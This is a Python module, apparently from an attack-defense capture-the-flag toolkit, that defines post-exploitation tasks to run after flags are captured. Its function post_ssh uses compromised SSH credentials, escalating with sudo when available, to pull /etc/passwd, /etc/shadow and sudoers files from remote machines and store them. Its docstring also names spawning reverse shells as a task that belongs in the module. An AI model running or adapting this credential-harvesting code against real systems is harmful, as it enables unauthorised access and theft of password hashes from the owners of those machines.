"""
Tasks to do after checking/retrieving flags.

These functions **MUST NOT** bubble exceptions. A post
task failing does not mean the protocol has failed,
just any of the fun stuff you want to do afterwards.

Things that belong here:
- grabbing fun (non-flag) files
- spawning reverse shells

Things that don't belong here:
- grabbing flags
"""
import logging
import os
from collections import deque
from typing import Tuple

import paramiko

from .exploit import get_directory, get_file, run_command, run_sudo
from .models import Credential, File

logger = logging.getLogger(__name__)

# Sensitive files to find on systems. Paths
# ending in / are directories.
SENSITIVE_FILES = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/sudoers',
    '/etc/sudoers.d/',
]


def post_ssh(ssh: paramiko.SSHClient, credential: Credential):
    """
    Post tasks for SSH.

    :param ssh: The existing ssh connection
    :param credential: The credentials associated with this connection
    """

    # Stage 0 - Determine access level
    # If we have sudo access, we need to tell the various exploit
    # functions so they can use it.
    sudo = credential.bag.password if credential.sudo else None

    # Stage 1 - Sensitive Files

    def _get_file_info(path: str) -> Tuple[str, str]:
        name_cmd = 'file -b {}'.format(path)
        mime_cmd = 'file -i -b {}'.format(path)
        if sudo:
            _, stdout, _ = run_sudo(ssh, name_cmd, sudo)
            name = stdout.read().decode('utf-8').strip()
            _, stdout, _ = run_sudo(ssh, mime_cmd, sudo)
            mime = stdout.read().decode('utf-8').strip()
        else:
            name = run_command(ssh, name_cmd)
            mime = run_command(ssh, mime_cmd)
        return name, mime

    queue = deque(SENSITIVE_FILES)
    while len(queue):
        path = queue.pop()

        if path[-1] == '/':
            directory = get_directory(ssh, path, sudo)
            if directory:
                queue.extend(map(lambda x: os.path.join(path, x.strip()), directory))
        else:
            if File.select().where(File.service == credential.service, File.path == path).count() >= 1:
                continue

            info = _get_file_info(path)
            contents = get_file(ssh, path, sudo)
            if contents:
                File.create(path=path, contents=contents, mime_type=info[1], info=info[0],
                            service=credential.service)
            else:
                logger.error("There was an error retrieving sensitive file %s: %s", path, contents)
